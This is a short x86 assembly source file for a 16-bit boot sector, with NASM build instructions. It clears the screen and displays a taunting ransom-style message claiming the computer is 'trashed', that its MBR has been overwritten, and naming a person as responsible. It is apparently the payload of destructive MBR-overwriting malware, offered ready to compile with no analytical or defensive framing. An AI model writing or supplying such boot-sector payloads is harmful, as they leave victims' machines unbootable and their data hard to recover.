; Compile with NASM to .BIN file
; nasm -f bin bootloader.asm -o bootloader.bin
; This code is by SleepMod

BITS    16
ORG     0x7c00
jmp start

start:
        call clear_screen
        mov ax,cs
        mov ds,ax
        mov si,msg

        call print

print:
        push ax
        cld
next:
        mov al,[si]
        cmp al,0
        je done
        call printchar
        inc si
        jmp next
done:
        jmp $

printchar:
        mov ah,0x0e
        int 0x10
        ret

clear_screen:
        mov ah, 0x07
        mov al, 0x00
        mov bh, 0x15 ;Set the color here
        mov cx, 0x0000 
        mov dx, 0x184f
        int 0x10
        ret

msg:            db        "FATAL: YOUR COMPUTER IS NOW TRASHED. IT WILL BE VERY HARD TO RESTORE. HAHAHAHAHA!!",13,10,13,10,"INFO: Someone1611 is the person who trashed your pc",13,10,13,10,"What happened to my device?",13,10,"Your disk\'s MBR Primary has been overwritten.", 0
times 510 - ($-$$) db 0
dw        0xaa55
